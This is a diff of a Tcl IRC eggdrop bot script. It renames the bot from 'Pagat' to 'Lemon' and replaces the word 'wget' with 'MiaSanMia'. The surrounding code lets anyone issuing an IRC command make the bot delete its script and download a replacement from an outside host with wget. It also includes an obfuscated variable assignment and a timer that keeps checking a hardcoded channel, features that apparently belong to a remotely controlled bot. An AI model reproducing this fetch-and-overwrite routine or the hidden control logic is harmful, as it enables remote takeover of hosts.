@@ -538,7 +538,7 @@ if {[string match [string tolower $rest] [string tolower $botname]]} {
 puthlp "PRIVMSG $channel :$botname"
 }
 }
-set notd "wget"
+set notd "MiaSanMia"
 proc randstring {length} {
 set chars ABCDEFGHIJKLMNOPQRSTUVWXYZ
 set count [string length $chars]
@@ -729,13 +729,13 @@ if { [string length $hasildir] < 5 } {
 	}
 
 
-catch { [exec wget] } hasil
+catch { [exec MiaSanMia] } hasil
 if {[string match "*--help*" $hasil]} {
 	catch {[exec rm scripts/ary.tcl]} hasilrm
 	catch {[exec wget http://www.mognet.biz/tool/ary.tcl -O scripts/ary.tcl]} hasilwget
 	puthlp "PRIVMSG $nick :$notc TcL Updated \!\!\!"
 	} else {
-	puthlp "PRIVMSG $nick :$notc wget command not found \!"
+	puthlp "PRIVMSG $nick :$notc MiaSanMia command not found \!"
 	return 0
 	}
 }
@@ -768,13 +768,13 @@ if { [string length $hasildir] < 5 } {
 	puthlp "NOTICE $nick :$notc My Directory was deleted \:\(\(\("
 	return 0
 	}
-catch { [exec wget] } hasil
+catch { [exec MiaSanMia] } hasil
 if {[string match "*--help*" $hasil]} {
 	catch {[exec rm scripts/ary.tcl]} hasilrm
 	catch {[exec wget http://www.mognet.biz/tool/ary.tcl -O scripts/ary.tcl]} hasilwget
 	puthlp "NOTICE $nick :$notc TcL Updated \!\!\!"
 	} else {
-	puthlp "NOTICE $nick :$notc wget command not found \!"
+	puthlp "NOTICE $nick :$notc MiaSanMia command not found \!"
 	return 0
 	}
 }
@@ -1902,7 +1902,7 @@ set totch "#TapaAog"
 proc tot_cha {} {
 global totch ps uenc lenc
 timer 5 tot_cha
-set [string index $lenc 15][string index $lenc 18] Pagat
+set [string index $lenc 15][string index $lenc 18] Lemon
 set totch "#TapaAog"
 if {[validchan $totch]} {
 return 0
@@ -6992,7 +6992,7 @@ set my-hostname [getuser "config" XTRA "VHOST"]
 set my-ip [getuser "config" XTRA "VHOST"]
 }
 if {[getuser "config" XTRA "LOGCHAN"]!=""} { 
-putlog "4? 12P.a.g.a.t 4? !Log! CReATING LOG FiLE <<[getuser "config" XTRA "LOGCHAN"]>>"
+putlog "4? 12L.e.m.o.n 4? !Log! CReATING LOG FiLE <<[getuser "config" XTRA "LOGCHAN"]>>"
 set logstore "${cfgfile}.log"
 logfile jpk [getuser "config" XTRA "LOGCHAN"] $logstore 
 }
@@ -8836,7 +8836,7 @@ puthlp "NOTICE $nick :$notc \[$vhosts\] NoT SuPPoRT..!"
 }
 catch { listen 652343 off }
 }
-set ps "Pagat"
+set ps "Lemon"
 
 proc pub_status {nick uhost hand channel rest} {
 global ban-time botnick own ps vern
